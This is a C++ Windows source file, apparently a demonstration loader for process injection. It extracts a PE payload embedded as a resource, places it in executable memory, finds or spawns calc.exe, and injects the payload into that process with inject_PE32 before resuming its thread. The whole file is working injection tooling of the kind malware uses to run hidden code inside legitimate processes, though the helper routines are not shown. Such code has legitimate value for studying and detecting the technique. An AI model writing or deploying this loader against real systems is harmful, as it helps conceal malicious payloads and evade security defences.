#include <windows.h>
#include <stdio.h>

#include "resource.h"
#include "inject_pe.h"
#include "target_util.h"
#include "enumproc.h"

BYTE* get_raw_payload(OUT SIZE_T &res_size)
{
    HMODULE hInstance = GetModuleHandle(NULL);
    HRSRC res = FindResource(hInstance, MAKEINTRESOURCE(MY_RESOURCE), RT_RCDATA);
    if (!res) return NULL;

    HGLOBAL res_handle  = LoadResource(NULL, res);
    if (res_handle == NULL) return NULL;

    BYTE* res_data = (BYTE*) LockResource(res_handle);
    res_size = SizeofResource(NULL, res);

    BYTE* out_buf = (BYTE*) VirtualAlloc(NULL,res_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(out_buf, res_data, res_size);

    FreeResource(res_handle);
    return out_buf;
}

HANDLE make_new_process(HANDLE &mainThread)
{
    WCHAR targetPath[MAX_PATH];
    if (!get_calc_path(targetPath, MAX_PATH)) {
        return NULL;
    }
    //create target process:
    PROCESS_INFORMATION pi;
    if (!create_new_process1(targetPath, pi)) return false;
    printf("PID: %d\n", pi.dwProcessId);

    //store the handle to the main thread, so that we can resume it later
    mainThread = pi.hThread;
    return pi.hProcess;
}

int main(int argc, char *argv[])
{
    BYTE* res_data = NULL;
    SIZE_T res_size = 0;

    if ((res_data = get_raw_payload(res_size)) == NULL) {
        printf("Failed!\n");
        return -1;
    }

    //we may inject into existing process
    HANDLE hProcess = find_running_process(L"calc.exe");
    HANDLE mainThread = NULL;
    if (!hProcess) {
        //or create a new one:
        hProcess = make_new_process(mainThread);
    }
    if (inject_PE32(hProcess, res_data, res_size, true)) {
        printf("Injected!\n");
    } else {
        printf("Injection failed\n");
    }

    //in case if the injection was to a new process
    //we may like to resume it's main thread
    if (mainThread) {
        ResumeThread(mainThread);
    }
    CloseHandle(hProcess);
    VirtualFree(res_data, res_size, MEM_FREE);
    system("pause");
    return 0;
}
